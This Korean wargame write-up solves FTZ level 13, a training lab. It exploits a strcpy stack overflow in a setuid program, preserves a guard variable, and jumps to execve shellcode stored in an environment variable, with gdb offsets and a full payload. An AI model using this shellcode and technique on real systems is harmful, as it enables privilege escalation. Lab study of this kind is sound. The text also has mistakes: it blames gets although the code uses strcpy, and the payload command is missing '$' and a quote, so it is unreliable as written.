# FTZ Level13

#### ID : level13 PW: have no clue
<br>

**먼저 ```ls -l```을 이용해 어떤 파일이 있는지 살펴보자**<br> 
attackme 프로그램에 level13의 권한으로 setuid가 걸려있는 것을 확인할 수 있다.<br><br>
우선 hint의 내용을 보자<br>
```cat hint```<br>
```c
#include <stdio.h>

int main(int argc, char *argv[])
{
      long i=0x1234567;
      char buf[1024];
      
      setreuid(3094, 3094);
      if(argc>1)                  #argv로 받는 입력이 1개 이상 있다면
      strcpy(buf, argv[1]);       #입력 buf로 복사
      
      if(i != 0x1234567){
      printf(" Warning: Buffer Overflow !!! \n");
      kill(0, 11);                #프로그램 종료
      }
}
```
```gets``` 함수에서 BOF가 일어날 수 있다!!<br>
또한 hint를 보면 i라는 변수가 0x1234567이 아닐 경우 프로그램을 종료시키는 것을 보아 BOF를 검사하고 있다.<br>

우리의 목적을 생각해보자.<br>
버퍼에 버퍼크기보다 넘치는 양을 담으면서 i는 0x1234567로 만들어줘야한다.  
그렇다면..!!!<br>
1. buf[1024]에서 i까지의 거리 구하기, i에서 ret까지의 거리 구하기
2. i를 0x1234567로 바꾸기
3. 환경 변수 선언하고 주소 얻디
4. 페이로드 작성하고 공격!

**attackme 코드를 디버깅해야하기 때문에 tmp폴더로 복사하자.**<br>
```cp attackme tmp```<br><br>
**그리고 디버깅을 해보자**<br>
```gdb -q attackme```<br>
```disas main```<br>

<main+3>을 보면 0x418만큼의 공간을 만들고 있다. 0x418은 10진수로 1048이다.<br>
i변수는 4byte, buf배열은 1024byte인데 1048을 할당했다는 것은 20byte만큼의 dummy가 있다는 것!<br>
dummy가 어디에 위치해 있는지 찾아봐야겠다.<br>
<main+61>을 보면 strcpy가 호출되고 있다. strcpy의 인자로 buf가 들어가는데!!<br>
<main+60> <main+54>를 보면 eax가 push되는데 그 eax의 주소가 0xfffffbe8인 것을 알 수 있다.<br>
그렇다! 0xfffffbe8이 바로 buf의 주소다! 이는 ebp로부터 -1048이다.<br>

i의 위치도 찾아보자.<br>
<main+69>를 보면 0x1234567과 0xfffffff4를 비교하고 있다. 0xffffff4가 i의 주소인 것이다.<br>
i는 ebp로부터 -12에 위치하고 있는 것이다.<br>

이제 buf에서 i까지의 거리를 구하면 1048-12=1036인 것을 알 수 있다.<br>
*( 0xffffff4 - 0xffffbe8해도 된다.)*<br>

그렇다면 우리가 작성할 페이로드는 다음과 같다고 할 수 있다.<br>
** "A"*(buf~i까지 거리)+0x1234567+"A"*(i에서 ret까지의 거리)+쉴 주소 **<br>

**자 이제 다음과 같이 환경변수를 작성해보자.** <br>
쉘 코드는 구글에서 돌아다니는 25byte짜리를 가져왔다. <br>
*(다음에 쉘 코드에 대해 더 공부해봐야겠다....)*<br>
```
export shellcode=$(python -c 'print "\x90"*20+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e
\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"')
```

**이제 쉘 코드의 주소를 알아보자**<br>
```vi shell.c``` vi로 쉘 주소 알아내는 코드를 작성해보자<br>
```c
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char *argv[1]){
      printf("%p\n", getenv("shellcode"));
      return 0;
}
```
그리고 만든 c코드를 컴파일 한 후 <br>
```gcc -o shell shell.c```<br>
실행시킨다!<br>
```./shell```<br>
그럼 주소가 떨어진다<br>
필자의 경우 **0xbffffef4**였다.<br>

**이제 페이로드를 작성해보자.**<br>
```./attackme (python -c 'print "A"*1036+"\x67\x45\x23\x01+"A"*12+"\xf4\xfe\xff\xbf"')```<br>
*(주소는 little endian 방식으로 입력된다)*<br>
<br>
```cd ..``` 다시 원래 디렉토리로 되돌아가서<br>
**공격 실시!**<br>
```./attackme (python -c 'print "A"*1036+"\x67\x45\x23\x01+"A"*12+"\xf4\xfe\xff\xbf"')```<br>
```my-pass```로 비밀번호를 물어보면<br>
Level14 Password is "~~". 라고 나올 것이다!!
